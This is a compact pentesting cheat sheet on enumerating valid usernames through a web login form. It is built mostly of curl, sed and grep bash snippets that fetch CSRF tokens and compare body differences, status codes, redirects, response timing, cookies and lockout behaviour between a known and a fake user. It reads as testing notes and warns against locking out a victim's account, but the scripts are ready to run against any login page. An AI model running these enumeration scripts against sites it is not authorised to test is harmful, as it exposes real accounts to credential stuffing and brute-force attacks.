# Login enumeration (deep) — the headline form, channel by channel

## The CSRF/session setup

```bash
# grab a fresh token per request — a stale token gives a fake differential
cj=/tmp/cj; rm -f $cj
tok() { curl -sc $cj "$BASE/login" | grep -oE 'name="(csrf|_token|authenticity_token)[^"]*" value="[^"]*"' | head -1 | cut -d'"' -f4; }
curl -sb $cj -i -X POST -d "user=$KNOWN&pass=x&csrf=$(tok)" "$BASE/login" > g
curl -sb $cj -i -X POST -d "user=$FAKE&pass=x&csrf=$(tok)"  "$BASE/login" > b
```

## Channel 1: the body — the residual hunt

```bash
mask() { sed -E 's/(csrf|nonce|token|_ts|request_id|timestamp)[^<"& ]*//g;s/value="[^"]*"//g;s/[a-zA-Z0-9+/=]{20,}//g'; }
diff <(mask<g) <(mask<b)
# hunt: error word / error_code / CSS class / data- / hidden input / comment
grep -oE '(error|invalid|incorrect|wrong|no such|not found|exist|locked|disabled)[^<"]*' g b
grep -oE 'data-[a-z-]*="[^"]*"' g b
grep -oE '<input[^>]*type="?hidden[^>]*>' g b
grep -oE '<!--.*-->' g b
```

## Channel 2: status + redirect

```bash
curl -s -D - -o /dev/null -X POST -d "user=$KNOWN&pass=x&csrf=$(tok)" "$BASE/login" | grep -iE '^HTTP|^location'
curl -s -D - -o /dev/null -X POST -d "user=$FAKE&pass=x&csrf=$(tok)"  "$BASE/login" | grep -iE '^HTTP|^location'
# ?e=1 vs ?e=2, ?error=user vs ?error=pass, /login vs /dashboard vs /error
```

## Channel 3: timing — session-pinned

```bash
# same cookie jar -> same worker; interleaved
> t; for i in $(seq 12); do
  curl -sb $cj -o /dev/null -w "g %{time_total}\n" -X POST -d "user=$KNOWN&pass=x&csrf=$(tok)&_=$i" "$BASE/login" >> t
  curl -sb $cj -o /dev/null -w "b %{time_total}\n" -X POST -d "user=$FAKE&pass=x&csrf=$(tok)&_=$i" "$BASE/login" >> t
done
# the median delta + the variance — timing-oracle.md
```

## Channel 4: the envelope + the lock

```bash
diff <(grep -i 'set-cookie' g) <(grep -i 'set-cookie' b)
# the lock oracle — N attempts on YOUR OWN known-good
for i in $(seq 12); do curl -sb $cj -o /dev/null -w '%{http_code} ' -X POST -d "user=$KNOWN&pass=x&csrf=$(tok)" "$BASE/login"; done
```

## The login-specific traps

- a `200` for both with a hidden-field error — the body hunt finds it
- a `302` for both to `/login?e=` — the param is the channel
- a `bcrypt` gap — timing; a `sha256` app — sub-jitter, drop to content
- a lockout on your own known-good — measure the threshold, never a
  victim's
- a `403 CSRF` on both — re-fetch the token per request

## The login record

`login: <channel>: <verbatim delta>` per confirmed channel; `login:
uniform` if all four measured-identical — a real negative for the
headline form, not the class.
